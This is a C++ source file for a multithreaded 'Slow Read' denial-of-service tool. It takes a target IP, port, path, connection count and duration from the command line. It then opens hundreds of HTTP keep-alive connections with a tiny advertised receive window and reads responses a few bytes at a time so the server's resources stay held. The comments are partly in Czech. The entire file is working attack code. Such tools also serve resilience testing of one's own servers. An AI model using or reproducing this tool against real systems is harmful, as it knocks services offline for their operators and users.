
#include "slowRead.h"
#include <iostream>
#include <ctime>
#include <fcntl.h>


using namespace std;

#define BUFF_SIZE_DEFAULT 32
#define REFRESH_TIME_MS 100
#define REFRESH_CNT     10

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int alive_threads;

pthread_mutex_t mutex_request_cnt = PTHREAD_MUTEX_INITIALIZER;
int request_cnt;


SlowRead::SlowRead(int argc, char **argv){
	
	dstIpStr = NULL;
	dstPort = 80;
	path= "/";
	con_nbr = 300;
	duration = 600;	//
	buff_size = 5;	// receiver buffer size (bytes)
        interval = 1*1000*1000; // interval of reading from rec. buffer (us)
	window_size = 50;       // advertised window size (max 65535 bytes)

	int c;
	while ((c = getopt(argc, argv, "d:D:c:p:T:w:b:n:")) != -1) 
	{
		switch (c)
		{
		
		case 'd':
			dstIpStr = optarg;
			break;
		case 'D':
			dstPort = atoi(optarg);
			break;
		case 'c':
			con_nbr = atoi(optarg);
			break;
		case 'p':
			path = optarg;		// napriklad: /image54.jpg ...
			break;
		case 'T':
			duration = atoi(optarg);
			break;
                case 'w':
			window_size = atoi(optarg);
			break;
                case 'b':        
                        buff_size = atoi(optarg); // velikost zasobniku ke cteni (v bajtech)
                        break;
                case 'n':        
                        interval = atoi(optarg)*1000; // miliseconds
                        break;                                            
		default:
			break; // zmenit na vypis napovedy
		}
	}
	
            printf("\n*-------------------- Slow Read attack starts --------------------*\n"
		"Parameters of attack: \n"
		"Target IP: %s  Port: %d\nPath: %s\nNumber of connections: %d\nWindow size: 8%d  Buffer size: %d   Interval to read:   %8d\nDuration: %d\n\n"
		, dstIpStr, dstPort, path, con_nbr, window_size, buff_size, interval/1000, duration);

	char header[1024] = "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n"; 
	
	sprintf(sendBuf,header,path,dstIpStr);

	memset(&servaddr, 0, sizeof(servaddr));		
	servaddr.sin_addr.s_addr = inet_addr(dstIpStr);
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(dstPort);

}

void SlowRead::run(){
	pthread_t *threads = new pthread_t[con_nbr];
	int rc;
	int i;
	SlowReadParams *params = new SlowReadParams[con_nbr];
        
        alive_threads = con_nbr;
        int request_cnt_old = 0;
        request_cnt = 0;

	for( i=0; i < con_nbr; i++ ){
		
		params[i].id = i;
		params[i].servaddr = servaddr;
		params[i].sendBuf = sendBuf;	
		params[i].duration = duration;
		params[i].interval = interval;
		params[i].buff_size = buff_size;
		params[i].window_size = window_size;

		rc = pthread_create(&threads[i], NULL, &SlowRead::slowReadThread, (void*)&params[i]);
	
		if (rc){ 
			cout << "Error:unable to create thread," << rc << endl;
 			break;
		}
	}
        time_t startTime = time(NULL);
                
        while(1){
            time_t curTime = time(NULL);
            if((curTime-startTime)> duration){
                exit(0);
            }
            printf("\rThreads:%8d\tHeaders send: %8d Req/sec: %5d Time:%ld sec\t\t\t\t\t", alive_threads, request_cnt,request_cnt-request_cnt_old, (long)curTime-startTime);
            fflush(stdout);
            request_cnt_old = request_cnt;
            usleep(1000000);
        }  
}

void* SlowRead::slowReadThread(void *threadid){
	
    struct SlowReadParams *params;
    params = (struct SlowReadParams *) threadid;

    int sock;
    int error_cnt = 0;
        
        
    while(1){    
 
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                if(error_cnt == REFRESH_CNT){
                    pthread_mutex_lock(&mutex);
                    alive_threads--;                       
                    pthread_mutex_unlock(&mutex);			
                    return NULL;
                }
                else{
                    error_cnt++;
                    usleep(REFRESH_TIME_MS*1000);
                    continue;
                }
        }
		
	int windows_size = params->window_size;
	int optlen = sizeof(windows_size);
        
	if(setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &windows_size, optlen) < 0) { // nastaveni velikosti okna socketu dle parametru
		fprintf(stderr, "ERROR: setsockopt\n");
		break;
	}
	
	if(connect(sock, (struct sockaddr *)&params->servaddr, sizeof(params->servaddr))== -1){
		if(error_cnt == REFRESH_CNT){
                            pthread_mutex_lock(&mutex);
                            alive_threads--;                       
                            pthread_mutex_unlock(&mutex);
                            close(sock);
                            return NULL;
                        }
                else{
                    error_cnt++;
                    usleep(REFRESH_TIME_MS*1000);
                    continue;
                }
	}
	
        write(sock, params->sendBuf, strlen(params->sendBuf)); // odeslat hlavicku
        
        pthread_mutex_lock(&mutex_request_cnt);
        request_cnt++;
        pthread_mutex_unlock(&mutex_request_cnt);
        
	char *buff = new char[params->buff_size]; 
	int read_len;

	while(1){
		read_len = read(sock,buff,params->buff_size); // precist z bufferu zadany pocet bajtu
		if(read_len <= 0){			
			break;
		}
		usleep(params->interval); // pockat zadany cas pred dalsim ctenim		
	}
    }
}